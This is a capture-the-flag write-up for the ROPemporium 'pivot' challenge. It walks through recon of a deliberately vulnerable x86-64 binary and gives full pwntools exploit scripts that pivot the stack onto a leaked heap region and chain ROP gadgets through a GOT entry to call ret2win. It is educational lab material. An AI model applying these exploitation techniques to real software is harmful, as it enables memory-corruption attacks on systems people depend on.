---
title: "ROPemporium — pivot"
date: 2026-05-21
ctf: "ROPemporium"           
category: "pwn"   
difficulty: "medium"    
tags: ["pwn", "rev", "stack", "x86-64"]
description: "Second-to-last challenge of ROPemporium — what stack pivoting looks like"
---

## Overview

This challenge is part of ROPemporium challenges and introduces you into the world of stack pivoting, a technique used to redirect the stack pointer to a controlled memory region bypassing space constraints on the original stack.
We will explore **two distinct approaches** to solving it. The first one simulates a **black-box remote scenario**: we can only rely on the information that the binary gives us, no library to analyze and obviously no environment assistance. The second takes advantage of **having the binary locally** allowing us to have a controlled environment and a different way to implement the exploit without using any gadgets.

## Recon

Let's start with some basic recon to get a better overview of the binary and understand at a high level what it does.

```bash
$ file ./pivot

./pivot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0e9fb878206e1858b042597fd36c51aa07497121, not stripped
```
No need to worry about special permissions or unusual linking, luckily it's just a standard ELF executable dynamically linked against the normal Linux libraries.

Let's go ahead and get a high-level understanding of the program's logic using `strings`:

```bash
$ strings ./pivot
...
printf
main
pwnme
"Call ret2win() from libpivot"
"The Old Gods kindly bestow upon you a place to pivot: %p"
*(output abbreviated)
```
The output highlights the most relevant functions and strings. We can see the classic `main()` function which will call the `pwnme()` function and two interesting strings. The first: *"call ret2win() from libpivot"* give us a strong hypothesis about our target. The second: *"The Old Gods kindly bestow upon you a place to pivot: %p"* is also worth noting, if you know a little C you will recognize that `%p` is a format specifier that prints a pointer address to the screen when combined with printf. This smells like a runtime leak.

Let's check the binary's security flags and mitigations:

```bash
$ rabin2 -I ./pivot
...
nx       true #<==== 
os       linux
pic      false
relocs   true
relro    partial
rpath    .
sanitize false
static   false
stripped false
subsys   linux
va       true
*(output abbreviated)
```
As with the other ROPemporium challenges the only significant mitigation enabled is NX (No-eXecute). This flag enforces memory segmentation, splitting the address space into regions that are either writable-but-not-executable, or executable-but-not-writable effectively preventing us from injecting and executing shellcode directly on the stack.


With that out of the way let's run the binary and see if it leaks any addresses, as suggested by the `%p` format specifier we spotted earlier:
```bash
$ ./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7f3f2d60af10 #<== string that we talked before
Send a ROP chain now and it will land there
> A 	    #<== (user input)
Thank you!

Now please send your stack smash
> B			#<== (user input)
Thank you!

Exiting
```
As expected, the program leaks a pointer address at runtime. Other than that nothing immediately useful we'll need to dig deeper. Before moving to static analysis let's fire up pwndbg to understand exactly what that pointer refers to:

```bash
$ pwndbg ./pivot
...
pwndbg> c
Continuing.
Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7ffff7a0af10 # <== "leaked" address 
Send a ROP chain now and it will land there
> a
Thank you!

Now please send your stack smash
> Bfoothold_function()
Thank you!

Breakpoint 2, 0x00000000004009a5 in pwnme ()

*(output abbreviated for a clearer explanation)

────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd680 ◂— 0
01:0008│-028 0x7fffffffd688 —▸ 0x7ffff7a0af10 ◂— 0xa61 /* 'a\n' */  # <== same address that there is in the string 
02:0010│-020 0x7fffffffd690 ◂— 0xa42 /* 'B\n' */
03:0018│-018 0x7fffffffd698 ◂— 0
... ↓        2 skipped
06:0030│ rbp 0x7fffffffd6b0 —▸ 0x7fffffffd6d0 ◂— 1
07:0038│+008 0x7fffffffd6b8 —▸ 0x4008cc (main+133) ◂— mov qword ptr [rbp - 0x10], 0
```

Now the picture is clear. The leaked address points to a separate writable memory region where our first input *"a"* was stored. The second input *"B"* lands on the actual stack, but with very limited space, only 0x40 bytes compared to the 0x100 bytes available in the allocated pivot region.

## Static analysis & Reasoning

Let's take a look at the decompiled output from Ghidra to start doing some analysis.

`main()`:

![Ghidra analysis main](images/ghidra_pivot_main.png)

There isn't much to say about this function, it initializes the memory buffer where the bulk of the user input will be stored. If no error occurs, execution jumps to the `if_not_error` label, which is still part of `main()` and is shown below.

Sub-section of `main()`:

![Ghidra analysis main 2nd part](images/ghidra_pivot_main_2.png)

This part initializes the pointer to the allocated memory region by adding a fixed offset every time the program is run, then uses this address as the storage location for the first input in `pwnme()`, before handling its return value afterwards.

`pwnme():`

![Ghidra analysis main](images/ghidra_pivot_pwnme.png)

Let's take a look at the most interesting function in the program. It takes a pointer as a parameter `pwnme(*ptr)`  which is nothing more than the pointer to the memory region allocated in `main()`  as discussed in the previous section. Ghidra labels it `local_30`. The function first zeroes out the buffer for the upcoming input, then leaks the address of `local_30`, reads the first input into the pivot buffer, and finally prompts for a second input directly on the stack, with a buffer too small to contain it, leading to a buffer overflow, as in every ROPemporium challenge.

`Gadgets`

![Ghidra analysis main](images/ghidra_pivot_func_gadgets.png)

This last screenshot shows the example function provided by the challenge, which conveniently contains the gadgets we are going to use:

- `XCHG RAX, RSP` — swaps the value of RSP (the stack pointer) with the value in RAX, effectively redirecting the stack to wherever RAX points

- `MOV RAX, [RAX]` — dereferences RAX, loading the value stored at the address RAX points to

- `POP RAX` — pops a value from the stack directly into RAX, giving us control over it

- `ADD RAX, RBP` — adds the value of RBP to RAX, useful for offset calculations


### Mistakes and dead ends (local binary solution)

This time I didn't make many mistakes only one worth noting, which led me to a different solution that was of course invalid, but I think it's quite cool to talk about, as it explores a different way of thinking. You can also clearly see the difference in payload length between this approach and the correct one.
My first thought wasn't about using the address in the .got section (which we will cover in the Reasoning section). Instead, I thought: *why not use the memory map of the process to find where the library is loaded, and then add the function's offset from the library itself to call it directly?*

```python3
#!/usr/bin/env python3
from pwn import *

def exploit():
	C = 0
	start_addr = int()
	offset_ret2win = 0x0000000000000a81  # offset of ret2win from the library base (readelf -s ./libpivot.so)
	context.log_level = "info"
	elf = context.binary = ELF("/home/notsafe/pwn/ROP_Emporium/pivot/pivot", checksec = False) 
	lib = elf.path.rsplit("/", 1)[0] + "/libpivot.so" # full path of the shared library
	p = process(elf.path)

	with open(f"/proc/{p.pid}/maps") as file:  #open the memory map of the running process 
		for r in file:
			if lib in r.split(): #find the line where the library is mapped
				if C == 0:
					start_addr = int(r.split()[0].split("-")[0], 16) #parse the library base address
					C += 1
			
	ret2win_addr = start_addr + offset_ret2win #calculate the absolute address of ret2win
			
	payload = flat(
		b"A"*40,
		p64(0x400720), #call the foothold_function() to trigger the import
		p64(ret2win_addr), # jump directly to ret2win using the computed address
	)
	# output parsing
	p.recvuntil(b"> ")
	p.send(p64(0x00))
	p.recvuntil(b"> ")
	p.send(payload)
	p.recvuntil(b"foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot")
	flag = p.recvall()
	success(flag.decode())

exploit() 
```

### Reasoning
Let's explore the correct approach. This time we will make use of both the leaked pointer and the allocated memory region. We can summarize it in one sentence: just like the invalid solution, we will use the offset of the function from the library but instead of reading the memory map, we will simply use the GOT address of `foothold_function()` and add the difference between the two functions. However, there is one complication that makes this approach more challenging: the two separate memory sections. Let's dive into the reasoning:

**Stack Pivot:** the first thing we notice is that the buffer overflow on the stack is very limited, so we need to make use of the separately allocated memory region whose base address we already have from the leak. Our first input is where the actual ROP chain payload will reside. The second input will be used solely to perform the stack pivot via the `XCHG RAX`, RSP gadget.

**Function Resolution:** the first step is to call `foothold_function()` to trigger `_dl_runtime_resolve`, which will populate the .got section with the resolved absolute address of the function.

**Load Address into RAX and Add the Offset:** we then use our gadgets. First loading the GOT address of `foothold_function()` into RAX, dereferencing it to get the actual runtime address, and then adding the offset between `foothold_function()` and `ret2win()`.

**Jump to RAX:** the final and simplest step — we use a `JMP RAX` gadget to redirect execution to the computed address of `ret2win()`.

## Exploit

```python
#!/bin/env python3
from pwn import *

def exploit():
	context.log_level = 'info'
	elf = context.binary = ELF("/home/notsafe/pwn/ROP_Emporium/pivot/pivot", checksec=False)
	p = process(elf.path)
	p.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: ")
	addr = p.recvline()
	p.recvuntil(b"> ")
	
	payload1 = flat( #ROP chains explanation - 2nd part
		p64(0x400726), # call foothold_function() -> triggers GOT resolution
		p64(0x4009bb), #POP RAX
		p64(0x601040), #foothold_function@got
		p64(0x4009c0), #MOV RAX, [RAX] (dereference GOT entry)
		p64(0x400829), #POP RBP 
		p64(0x117), #offset (ret2win() - foothold_function) -> (readelf -s ./libpivot.so)
		p64(0x4009c4), #ADD RAX, RBP (add offset to make RAX point to ret2win)
		p64(0x400803), #jmp to RAX
	)
	payload2 = flat( #Stack smashing + stack pivoting - 1st part (execution order)
		b"A"*40, 
		p64(0x4009bb), #POP RAX 
		p64(int(addr.decode(), 16)), #address of memory leaks (load into RAX)
		p64(0x4009bd), #XCHG RAX,RSP change the location of the stackpop to the memory region
		)
	
	p.send(payload1)
	p.recvuntil(b"> ")
	p.send(payload2)
	p.recvuntil(b"Thank you!")
	flag = p.recvall()
	print("=========FLAG=========")
	success(flag.decode().split("\n")[2])
exploit()
```

## Result

Finally, after the exploitation, we achieved our flag!

<div class="flag-box">ROPE{a_placeholder_32byte_flag!}</div>

## Takeaways

- Stack pivoting vs stack smashing and how a hybrid approach can combine both techniques effectively

- Process memory layout, how it works, and how dynamic analysis can save significant time during exploitation

- Leaked addresses matter, never overlook a runtime address leak; it can be the key to the entire exploit

- New x86-64 opcodes and how they can be chained as ROP gadgets
